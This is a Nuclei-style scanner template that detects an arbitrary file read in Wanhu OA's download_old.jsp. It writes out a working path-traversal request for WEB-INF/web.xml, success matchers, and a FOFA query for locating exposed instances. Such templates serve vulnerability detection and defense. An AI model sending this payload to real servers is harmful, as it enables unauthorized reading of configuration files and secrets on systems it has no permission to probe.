id: wanhu-download-old-file-read
info:
  name: Wanhu OA download_old.jsp - Arbitrary File Read
  author: SleepingBag945
  severity: high
  description: |
    There is an arbitrary file download vulnerability in the Wanhu OA download_old.jsp file. An attacker can download any file on the server through the vulnerability.
  reference:
    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/wanhu-oa-download-old-file-read.yaml
    - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20download_old.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
  classification:
    cwe-id:
      - CWE-23
      - CWE-73
  metadata:
    fofa-query: app="万户网络-ezOFFICE"
    max-request: 1
    verified: true
  tags: lfi,vuln,wanhu
http:
  - matchers:
      - condition: and
        type: word
        words:
          - <?xml version=
          - web-app
          - display-name
      - status:
          - 200
        # digest: 4a0a00473045022100e4cf725a2dbc778ee14a6abbb3921c360759aea2da320362bb7863f3e0a199d802200ba0326b94400acfc4f09fb096d518043a55f05fcc0fcdfa7b3350be52636ab8:922c64590222798bb761d5b6d8e72950

        type: status
    matchers-condition: and
    method: GET
    path:
      - '{{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml'
